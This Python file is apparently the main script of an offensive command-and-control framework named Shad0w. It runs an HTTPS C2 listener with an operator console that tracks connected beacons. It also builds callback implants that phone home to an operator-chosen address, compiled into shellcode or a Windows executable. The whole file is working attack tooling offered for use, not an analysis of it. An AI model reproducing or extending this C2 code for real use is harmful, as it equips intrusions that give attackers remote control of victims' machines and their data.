#!/usr/bin/env python3

import ssl
import socket
import argparse

from threading import Thread

from lib import debug
from lib import banner
from lib import http_server
from lib import console
from lib import encryption
from lib import buildtools

class Shad0wC2(object):

    def __init__(self, args):

        super(Shad0wC2, self).__init__()

        # declare all the vitial variables to run.
        self.addr           = (args['address'], args['port'])
        self.debugv         = args['debug']
        self.sslkey         = args['key']
        self.sslcrt         = args['cert']

        # runtime variables
        self.beacons        = {}
        self.beacon_count   = 0
        self.current_beacon = None

        # get the debug/logging stuff ready
        self.debug          = debug.Debug(self.debugv)

        # console class
        self.console        = console.Console(self)

        # super useful
        self.crypt          = encryption

    def start(self):

        # show the banner
        banner.Banner()

        # start the http server thread
        self.debug.log("starting http server thread")
        thttp = Thread(target=http_server.run_serv, args=(self,))
        thttp.daemon = False
        thttp.start()

        # start the console thread
        tconsole = Thread(target=self.console.start)
        tconsole.daemon = False
        tconsole.start()


class Shad0wBuilder(object):

    def __init__(self, args):

        super(Shad0wBuilder, self).__init__()

        # key variables for the build
        self.address = args['address']
        self.port    = args['port']
        self.jitter  = args['jitter']
        self.format  = args['format']
        self.outfile = args['out']
        self.debugv  = args['debug']

        # get the debug/logging stuff ready
        self.debug   = debug.Debug(self.debugv)

    def build(self):

        # copy source files into build directory
        buildtools.clone_source_files()

        # change the settings file based on the args we been given
        buildtools.update_settings_file(self)

        # now we need to run 'make' inside the cloned dir
        buildtools.make_in_clone()

        # now get the beacon in the correct format
        if self.format == "raw":
            # extract the shellcode from the new beacon
            rcode = buildtools.extract_shellcode()

            # write the shellcode
            buildtools.write_and_bridge(self.outfile, rcode)
        
        if self.format == "exe":
            # get the bytes of the exe
            with open("/root/shad0w/beacon/beacon.exe", 'rb') as file:
                rcode = file.read()

            # then give them the exe and bridge it
            buildtools.write_and_bridge(self.outfile, rcode)




if __name__ == '__main__':

    # sort the first cmd switch to decide weather we beacon or listen
    first_parser = argparse.ArgumentParser()
    first_parser.add_argument("listen", action="store_true", help="Tell shad0w to listen for connections")
    first_parser.add_argument("beacon", action="store_true", help="Tell shad0w to create a beacon")

    # parse the args
    args, unk = first_parser.parse_known_args()

    # if we not been given any args then quit
    try:
        mode = ''.join(unk[0])
    except IndexError:
        first_parser.print_help()
        exit(-1)

    # if its neither beacon or listen then quit
    if (mode != "listen") and (mode != "beacon"):
        first_parser.print_help()
        exit(-1)
    
    # set the arguments for the listen
    if mode == "listen":
        listen_parser = argparse.ArgumentParser(prog="listen")
        listen_parser.add_argument("-a", "--address", required=False, default="0.0.0.0", help="Address shad0w will listen on (default will be 0.0.0.0)")
        listen_parser.add_argument("-p", "--port", required=False, default=443, help="Port the C2 will bind to (default is 443)")
        listen_parser.add_argument("-k", "--key", required=False, default="certs/key.pem", help="Private key for the HTTPS server")
        listen_parser.add_argument("-c", "--cert", required=False, default="certs/cert.pem", help="Certificate for the HTTPS server")
        listen_parser.add_argument("-d", "--debug", required=False, action='store_true', help="Start debug mode")

        args = vars(listen_parser.parse_args(unk[1:]))

        # start the C2 listening
        shad0w = Shad0wC2(args)
        shad0w.start()
    
    # set the arguments for creating the beacon
    if mode == "beacon":
        beacon_parser = argparse.ArgumentParser(prog="beacon")
        beacon_parser.add_argument("-a", "--address", required=True, help="Address the beacon will connect to")
        beacon_parser.add_argument("-p", "--port", required=False, default=443, help="Port the beacon will connect on")
        beacon_parser.add_argument("-j", "--jitter", required=False, default=1, type=int, help="Jitter the beacon should use when connecting back")
        beacon_parser.add_argument("-f", "--format", required=True, choices=('raw', 'exe'), help="Format to drop the beacon in (raw or exe)")
        beacon_parser.add_argument("-o", "--out", required=True, help="File to store the beacon in")
        beacon_parser.add_argument("-d", "--debug", required=False, action='store_true', help="Start debug mode")

        args = vars(beacon_parser.parse_args(unk[1:]))

        # build the beacon
        shad0w = Shad0wBuilder(args)
        shad0w.build()